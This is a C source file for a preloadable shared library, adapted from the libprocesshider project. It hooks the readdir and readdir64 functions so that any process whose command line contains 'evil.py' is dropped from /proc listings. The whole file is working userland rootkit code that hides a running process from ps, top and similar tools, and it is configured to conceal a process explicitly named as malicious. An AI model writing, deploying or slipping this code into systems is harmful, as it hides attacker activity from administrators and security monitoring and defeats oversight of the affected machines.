#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

// Thx to https://github.com/gianlucaborello/libprocesshider

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "evil.py";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

static void patch_str(char *cmdline)
{
  int pos = 0;
  for (int i = 255; i != 0; i--)
  {
    if (cmdline[i] != '\0')
      if (i != strlen(cmdline))
      {
          pos = i;
          break;
      }
  }
  //printf("Pos: %d\n", pos);

  for (int i = 0; i != pos; i++)
  {
    if (cmdline[i] == 0)
      cmdline[i] = ' ';
  }
  cmdline[pos+1] = '\0';
}


/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp_file[256] = {0};
    char tmp_content[256] = {0};
    snprintf(tmp_file, sizeof(tmp_file), "/proc/%s/cmdline", pid);

    // Open file
    FILE* f = fopen(tmp_file, "r");
    if(f == NULL) {
        return 0;
    }

    // Get content
    if(fgets(tmp_content, sizeof(tmp_content), f) == NULL) {
        fclose(f);
        return 0;
    }
    fclose(f);

    patch_str(tmp_content);

    //int unused;
    //sscanf(tmp_content, "%d (%[^)]s", &unused, buf);
    strncpy(buf, tmp_content, 256);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, "readdir");               \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                get_process_name(dir->d_name, process_name) &&          \
/*                strcmp(process_name, process_to_filter) == 0) {*/     \
                  strstr(process_name, process_to_filter) != NULL) {    \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
